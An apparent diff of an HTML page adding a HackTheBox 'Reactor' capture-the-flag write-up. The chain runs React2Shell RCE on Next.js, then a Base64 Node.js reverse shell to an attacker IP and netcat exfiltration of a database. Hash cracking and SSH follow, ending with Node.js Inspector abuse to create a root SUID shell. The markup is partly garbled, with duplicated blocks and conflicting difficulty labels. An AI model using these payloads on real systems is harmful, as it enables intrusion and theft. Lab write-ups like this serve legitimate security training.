@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Reactor • HTB Writeup</title>
+    <title>Reactor — HackTheBox Writeup • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -17,66 +17,399 @@
             padding: 2rem;
         }
         .container {
-            max-width: 800px;
+            max-width: 1200px;
             width: 100%;
             background: rgba(12, 16, 28, 0.9);
             border: 1px solid rgba(0, 255, 200, 0.15);
             border-radius: 2rem;
             padding: 3rem;
-            text-align: center;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
         }
         h1 {
             font-size: 2.5rem;
             color: #6fffe0;
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
         }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
+        .meta-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem 2rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
             border-radius: 1rem;
+            margin-bottom: 2rem;
         }
-        .status i {
-            color: #ffcc00;
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        .box.info { border-left-color: #4a9eff; background: rgba(74, 158, 255, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        
+        .ascii-art {
+            text-align: center;
+            opacity: 0.3;
+            font-size: 0.5rem;
+            line-height: 1.2;
+            color: #6fffe0;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        
+        .cve-tag {
+            display: inline-block;
+            background: rgba(255, 0, 0, 0.15);
+            color: #ff6666;
+            padding: 0.2rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
             margin-right: 0.5rem;
         }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
+        .highlight {
+            background: rgba(0, 255, 200, 0.05);
+            border: 1px solid rgba(0, 255, 200, 0.1);
+            border-radius: 0.5rem;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+        }
+        .attack-chain {
+            background: rgba(0, 255, 200, 0.02);
+            border: 1px solid rgba(0, 255, 200, 0.1);
             border-radius: 1rem;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
             color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
+            line-height: 1.8;
+            overflow-x: auto;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB Reactor</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+
+<div class="container">
+    
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Reactor</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 3000</span>
+        <span><strong>OS:</strong> Linux</span>
     </div>
+Reactor — HackTheBox Writeup</h1>
+
+<div class="box">**Difficulty:** Easy  </div>
+<div class="box">**OS:** Linux (Ubuntu 24)  </div>
+<div class="box">**CVEs:** CVE-2025-55182 (React2Shell RCE), CVE-2025-29927 (investigated, discarded)  </div>
+<div class="box">**Stack:** Next.js 15.0.3, OpenSSH 9.6p1, SQLite, Node.js Inspector  </div>
+
+<div class="attack-chain"><pre>## Attack Chain Overview
+
+```text</pre></div>
+<p>Next.js 15.0.3 (Port 3000) </p>
+<p>  --> CVE-2025-55182 (RSC Flight Deserialization Prototype Pollution) </p>
+<p>  --> RCE as nextjs</p>
+<p>  --> Exfiltrate SQLite DB (/opt/reactorwatch/reactor.db)</p>
+<p>  --> Dump Users & Crack MD5 Hash</p>
+<p>  --> SSH as engineer</p>
+<p>  --> Internal Node.js Inspector on Port 9229 running as Root</p>
+<p>  --> Execute JS via WebSocket </p>
+<p>  --> Copy /bin/bash & Apply SUID -> rootbash</p>
+<pre><code>
+## Table of Contents
+
+1. [Reconnaissance](#reconnaissance)
+2. [Initial Access](#initial-access)
+3. [User Flag](#user-flag)
+4. [Privilege Escalation](#privilege-escalation)
+5. [Root Flag](#root-flag)
+6. [Key Takeaways](#key-takeaways)
+7. [Related Notes](#related-notes)
+
+---
+
+## Reconnaissance
+
+### Port Scanning
+
+I started with a full TCP port scan using [nmap](../../../tools/recon/nmap.md), followed by a targeted service enumeration scan on the open ports.
+</code></pre>
+<p>nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent</p>
+<p>nmap -sVC -p 22,3000 $TARGET -oN service</p>
+<pre><code>
+**Open Ports:**
+
+| Port | Service | Version |
+|------|---------|---------|
+| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
+| 3000/tcp | HTTP | Next.js (X-Powered-By: Next.js) |
+
+**Nmap Observations:**
+- Port 3000 returned headers `x-nextjs-cache`, `x-nextjs-prerender`, and `X-Powered-By: Next.js`.
+- It only accepts `GET` and `HEAD` methods — `OPTIONS` and `POST` without proper headers return a 400 Bad Request.
+- The response is pre-rendered with `Cache-Control: s-maxage=31536000` (1-year cache).
+- No additional TCP or UDP ports were discovered.
+
+### Web Enumeration
+
+I fuzzed the web application using [feroxbuster](../../../tools/fuzz/feroxbuster.md) to discover hidden directories or assets.
+</code></pre>
+<p>feroxbuster -u http://$TARGET:3000 \</p>
+<p>  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \</p>
+<p>  --status-codes 200 301</p>
+<pre><code>
+**Output:**
+</code></pre>
+<p>200  GET  17175c   http://$TARGET:3000/</p>
+<p>200  GET   3329c   http://$TARGET:3000/_next/static/chunks/webpack-db0a529a99835594.js</p>
+<p>200  GET    463c   http://$TARGET:3000/_next/static/chunks/main-app-4fbb4b1f318e39a0.js</p>
+<p>200  GET  166088c  http://$TARGET:3000/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js</p>
+<p>200  GET  181180c  http://$TARGET:3000/_next/static/chunks/517-d083b552e04dead1.js</p>
+<p>200  GET   6707c   http://$TARGET:3000/_next/static/css/414e1be982bc8557.css</p>
+<p>200  GET  112594c  http://$TARGET:3000/_next/static/chunks/polyfills-42372ed130431b0a.js</p>
+<pre><code>
+Only the web root `/` and static Next.js assets were exposed. There were no additional routes or redirects.
+
+### Application Analysis
+
+The application is **ReactorWatch — Core Monitoring System v3.2.1**, a nuclear reactor monitoring dashboard.
+
+**Information Extracted from HTML and the Build Manifest:**
+- **Framework:** Next.js 15.0.3 (App Router)
+- **BuildId:** `L3bimJe_3LvBcFWAnK5L4`
+- **Company:** Nuclear Dynamics Corp — FACILITY: SITE-7
+
+The Build Manifest (`/_next/static/L3bimJe_3LvBcFWAnK5L4/_buildManifest.js`) confirmed it was a pure App Router configuration:
+</code></pre>
+<p>sortedPages: ["/_app", "/_error"]</p>
+<pre><code>
+No additional pages were registered — the app consists solely of the public root path.
+
+**Personnel listed on the dashboard (potential system users):**
+
+| Initials | Name | Role | Status |
+|----------|------|------|--------|
+| DR | Dr. Elena Rodriguez | Lead Nuclear Engineer | ONLINE |
+| MK | Marcus Kim | Senior Technician | ONLINE |
+| JT | James Thompson | Safety Officer | OFFLINE |
+
+---
+
+## Initial Access
+
+### Vulnerability Identification
+
+**CVE-2025-29927 — Middleware Bypass (Discarded)**
+This CVE allows bypassing middleware authentication in Next.js by injecting the `x-middleware-subrequest` header. I investigated it extensively, but since the app has no protected routes or redirects, the CVE did not apply.
+</code></pre>
+<p>curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \</p>
+<p>  http://$TARGET:3000/dashboard</p>
+<h1>Reactor — HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Reactor</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 3000</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+→ 404, route does not exist</h1>
+<pre><code>
+**CVE-2025-55182 — React2Shell RCE ✅**
+This is a prototype pollution vulnerability during the deserialization of the RSC Flight protocol in `react-server-dom-webpack` (versions 19.0.0–19.2.0). It permits arbitrary Remote Code Execution (RCE) in the Node.js server process without authentication. Affected Next.js versions are 15.0.0–16.0.6, and the target was running **15.0.3**, making it vulnerable.
+
+**Detection Oracle:**
+By sending a POST request to `/` with an invalid `Next-Action` header, the server responded with a 500 status and a body containing `E{"digest"`, confirming vulnerability.
+</code></pre>
+<p>curl -X POST http://$TARGET:3000/ \</p>
+<p>  -H "Content-Type: multipart/form-data" \</p>
+<p>  -H "Next-Action: abc123"</p>
+<pre><code></code></pre>
+<p>HTTP/1.1 500</p>
+<p>Content-Type: text/x-component</p>
+
+<p>0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}</p>
+<p>1:E{"digest":"3992125796"}</p>
+<pre><code>
+I further confirmed this using Assetnote's `react2shell-scanner`:
+</code></pre>
+<p>git clone https://github.com/assetnote/react2shell-scanner</p>
+<p>cd react2shell-scanner</p>
+<p>python3 -m pip install requests --break-system-packages</p>
+<p>python3 scanner.py -u http://$TARGET:3000 --safe-check</p>
+<pre><code></code></pre>
+<p>[VULNERABLE] http://$TARGET:3000 - Status: 500</p>
+<div class="attack-chain"><pre>The attack chain leverages the RSC Flight protocol deserializer in three stages:
+1. **Prototype Pollution**: Injecting `"then": "$1:__proto__:then"` writes a `then` function to `Object.prototype`, transforming all objects into "thenables" and hijacking RSC's internal async flow.
+2. **Function Constructor Rebind**: Directing `_formData.get` to `"$1:constructor:constructor"` chains `object.constructor` → `Object` → `Object.constructor` → `Function`, fetching the global JavaScript Function constructor.
+3. **Code Execution**: The framework internally invokes `_formData.get()` with the `_prefix` value as source code, effectively running `Function(_prefix)()`.
+
+Using a modified [React2Shell script](../../../exploits/web-rce/react2shell-cve-2025-55182.md) that supports dynamic commands, I tested execution:
+
+```bash</pre></div>
+<pre><code>
+### Exploitation — CVE-2025-55182 (RCE)
+
+python3 exploit.py -u http://$TARGET:3000 --cmd "id"</code></pre>
+
+<p>The command output was reflected in the <code>X-Action-Redirect</code> header:</p>
+
+<pre><code>X-Action-Redirect: /logina=uid=1000(nextjs) gid=1000(nextjs) groups=1000(nextjs);307</code></pre>
+
+<p>To establish a reverse shell while avoiding quote escaping issues in standard <code>/bin/sh</code> or bash shells, I opted for a Node.js reverse shell encoded in Base64:</p>
+
+<pre><code># Generate the base64 payload
+echo -n "node -e '(function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(12345, \"10.10.15.73\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'" | base64 -w0</code></pre>
+
+<pre><code># Start the listener
+nc -lvnp 12345
+
+# Send the payload via the exploit
+python3 exploit.py -u http://$TARGET:3000 \
+  --cmd "echo <BASE64_PAYLOAD> | base64 -d | bash"</code></pre>
+
+<p>I successfully obtained a shell as the <code>nextjs</code> user (<code>uid=1000</code>).</p>
+
+<hr />
+
+<h2>User Flag</h2>
+
+<p>Once inside as <code>nextjs</code>, I enumerated the system for interesting files:</p>
+
+<pre><code>ls -la /opt/
+ls -la ~
+find / -name "*.db" 2>/dev/null</code></pre>
+
+<p>I discovered an SQLite database at <code>/opt/reactorwatch/reactor.db</code>. I exfiltrated it to my attacking machine:</p>
+
+<pre><code># On the victim machine
+nc 10.10.15.73 80 < /opt/reactorwatch/reactor.db</code></pre>
+<pre><code># On the attacking machine (Kali)
+nc -lvnp 80 > reactor.db</code></pre>
+
+<p>Using [sqlite3](../../../tools/database/sqlite3.md), I dumped the users table:</p>
+
+<pre><code>sqlite3 reactor.db .dump
+sqlite3 reactor.db "SELECT * FROM users;"</code></pre>
+
+<pre><code>1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb</code></pre>
+
+<p>I extracted two MD5 hashes. Verifying against <code>/etc/passwd</code> confirmed that the user <code>engineer</code> existed on the system.</p>
+
+<p>I cracked the hash using [hashcat](../../../tools/creds/hashcat.md):</p>
+
+<pre><code>echo "a203b22191d744a4e70ada5c101b17b8" > hashes.txt
+echo "39d97110eafe2a9a68639812cd271e8e" >> hashes.txt
+hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+<pre><code>39d97110eafe2a9a68639812cd271e8e:reactor1</code></pre>
+
+<p>The hash for <code>engineer</code> cracked to <code>reactor1</code>. I used this password to SSH into the machine and read the user flag.</p>
+
+<pre><code>ssh engineer@$TARGET
+cat /home/engineer/user.txt</code></pre>
+
+<hr />
+
+<h2>Privilege Escalation</h2>
+
+<p>Running as <code>engineer</code>, I checked the internal services:</p>
+
+<pre><code>ss -tulpn
+ps aux | grep node</code></pre>
+
+<pre><code>tcp   LISTEN  0  511  127.0.0.1:9229   *:*
+root  1411  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js</code></pre>
+
+<p>A Node.js process was running as <strong>root</strong> with the V8 debugger (<code>--inspect</code>) listening locally on <code>127.0.0.1:9229</code>. The [Node.js Inspector](../../../privesc/linux/nodejs-inspector.md) allows unauthenticated WebSocket connections to execute arbitrary JavaScript in the context of the running process.</p>
+
+<p>First, I obtained the WebSocket ID:</p>
+
+<pre><code>curl -s http://127.0.0.1:9229/json</code></pre>
+
+<pre><code>[{
+  "id": "0e8809c7-fc0e-426d-9e16-0e9dff19842a",
+  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/0e8809c7-fc0e-426d-9e16-0e9dff19842a",
+  "title": "/opt/uptime-monitor/worker.js",
+  "type": "node"
+}]</code></pre>
+
+<p>I then used a Python script to connect to the WebSocket and execute JavaScript that creates a SUID copy of bash:</p>
+
+<pre><code>python3 -c "
+import websocket, json
+ws = websocket.create_connection('ws://127.0.0.1:9229/0e8809c7-fc0e-426d-9e16-0e9dff19842a')
+payload = {
+    'id': 1,
+    'method': 'Runtime.evaluate',
+    'params': {
+        'expression': 'process.mainModule.require(\"child_process\").execSync(\"cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash\").toString()'
+    }
+}
+ws.send(json.dumps(payload))
+print(ws.recv())
+ws.close()
+"</code></pre>
+
+<hr />
+
+<h2>Root Flag</h2>
+
+<p>With the SUID binary created by the root Node.js process, I gained a root shell and read the final flag.</p>
+
+<pre><code>/tmp/rootbash -p
+# We are now root
+cat /root/root.txt</code></pre>
+
+<hr />
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li>**Next.js Versioning Matters**: Always pay attention to framework headers (e.g., `X-Powered-By: Next.js`) and cross-reference them with recent CVEs. Next.js 15.0.3 specifically pointed to the React2Shell vulnerability.</li>
+<li>**Oracle Identification**: 500 internal server errors that contain stack traces or digests (`E{"digest"`) when hitting web frameworks often leak information indicating vulnerability to deserialization attacks.</li>
+<li>**Database Scavenging**: Any `.db` files lying around in non-standard directories (like `/opt/`) should be immediately exfiltrated and analyzed.</li>
+<li>**Internal Network Sockets**: Loopback connections (127.0.0.1) often expose highly privileged admin or debugging interfaces, like Node Inspector, which act as trivial PrivEsc vectors if unprotected.</li>
+</ol>
+
+<hr />
+
+<h2>Related Notes</h2>
+
+<ul>
+<li>[nmap](../../../tools/recon/nmap.md)</li>
+<li>[feroxbuster](../../../tools/fuzz/feroxbuster.md)</li>
+<li>[sqlite3](../../../tools/database/sqlite3.md)</li>
+<li>[hashcat](../../../tools/creds/hashcat.md)</li>
+<li>[react2shell-cve-2025-55182](../../../exploits/web-rce/react2shell-cve-2025-55182.md)</li>
+<li>[nodejs-inspector](../../../privesc/linux/nodejs-inspector.md)</li>
+</ul>
+
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
+
 </body>
 </html>
